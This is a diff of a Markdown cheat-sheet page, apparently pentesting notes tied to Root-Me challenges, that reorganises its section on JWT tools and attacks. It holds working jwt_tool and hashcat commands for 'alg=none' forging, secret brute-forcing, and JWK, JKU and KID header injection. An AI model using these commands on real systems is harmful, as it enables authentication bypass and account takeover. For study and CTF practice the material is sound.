@@ -24,14 +24,16 @@ They can be transferred and found in:
 * 💼 Request Body
 * ...
 
-📚 A common handy wordlist is [jwt-secrets](https://github.com/wallarm/jwt-secrets).
+📚 JWT is a specification, JWS <small>(mostly)</small>/JWE are implementations.
 </div></div>
 
 <hr class="sep-both">
 
-## Common JWT Attacks
+## JWT Tools
 
 <div class="row row-cols-lg-2"><div>
+
+#### jwt-tools (Python)
 
 You can use [jwt-tools](https://github.com/ticarpi/jwt_tool) <small>(5.4k ⭐)</small> to attack JWT:
 
@@ -47,12 +49,44 @@ $ jwt_tool 'jwt'             # decode
 $ jwt_tool 'jwt' -T          # encode
 $ jwt_tool 'jwt' -I -pc claim -pv value
 ```
+</div><div>
+
+#### jwt.io (Website)
 
 You can also use [jwt.io](https://jwt.io/).
 
 <br>
 
-#### Secret Key Brute Forcing
+#### JWT wordlists
+
+A common handy wordlist is [jwt-secrets](https://github.com/wallarm/jwt-secrets).
+</div></div>
+
+<hr class="sep-both">
+
+## Common JWT Attacks
+
+<div class="row row-cols-lg-2"><div>
+
+#### JWT — Unverified Signature
+
+It's possible for the signature to not be checked at all by the server.
+
+<br>
+
+#### JWT — Null Signature
+
+[![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
+
+If the signature algorithm is not verified, you may set it to 'none,' and remove the signature that is not required anymore.
+
+```ps
+$ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
+```
+
+<br>
+
+#### JWT — Weak Secret Key
 
 [![jwt_weak_secret](../../../../_badges/rootme/web_server/jwt_weak_secret.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
 
@@ -69,21 +103,7 @@ $ hashcat -m 16500 hash ./jwt.secrets.list
 
 <br>
 
-#### JWT Header Injection — None Algorithm
-
-[![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
-
-We may be able to disable the tampering check by setting the signature algorithm to 'none.'
-
-```ps
-$ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
-```
-
-📚 It also possible for the signature to not be checked at all by the server after issuing a JWT even if there is an algorithm.
-
-<br>
-
-#### JWT Header Injection — JWK
+#### JWT — JWK Header Injection
 
 [![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
 
@@ -95,7 +115,7 @@ $ jwt_tool 'jwt' -T -X i -hc kid -hv jwt_tool     # with kid
 ```
 </div><div>
 
-#### JWT Header Injection — JKU
+#### JWT — JKU Header Injection
 
 [![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
 
@@ -112,7 +132,7 @@ $ jwt_tool -X s -ju "URL/jwks.json" -I -hc kid -hv jwt_tool -pc claim -pv value
 
 <br>
 
-#### JWT Header Injection — KID
+#### JWT — KID Header Injection
 
 [![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
 [![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
@@ -130,7 +150,7 @@ $ jwt_tool "" -I -hc kid -hv "/dev/null" -S hs512 -p "" -pc claim -pv value
 
 <br>
 
-#### JWT Header Injection — RS256 to HS256
+#### JWT — Algorithm Confusion Attack
 
 [![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
 
